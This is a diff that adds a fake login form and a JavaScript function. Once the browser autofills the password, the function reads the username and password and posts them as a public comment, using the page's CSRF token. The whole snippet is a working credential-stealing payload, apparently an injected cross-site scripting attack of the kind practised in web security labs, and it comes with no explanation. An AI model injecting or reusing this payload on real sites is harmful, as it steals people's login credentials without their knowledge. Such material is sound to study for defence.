@@ -1,0 +1,37 @@
+<form class="login-form">
+    <input type="text" id="username" name="username"
+           autocomplete="username">
+
+    <input type="password" id="password" name="password"
+           autocomplete="current-password"
+           onchange="Leo()">
+</form>
+
+<script>
+function Leo() {
+
+    // Retrieve username and password
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+
+    // Retrieve CSRF token and post ID
+    var csrf = document.getElementsByName("csrf")[0].value;
+    var postId = document.getElementsByName("postId")[0].value;
+
+    // Submit the captured credentials as a new comment
+    fetch("/post/comment", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: new URLSearchParams({
+            csrf: csrf,
+            postId: postId,
+            comment: "Username: " + username + " Password: " + password,
+            name: "victim",
+            email: "victim@example.com",
+            website: ""
+        })
+    });
+}
+</script>
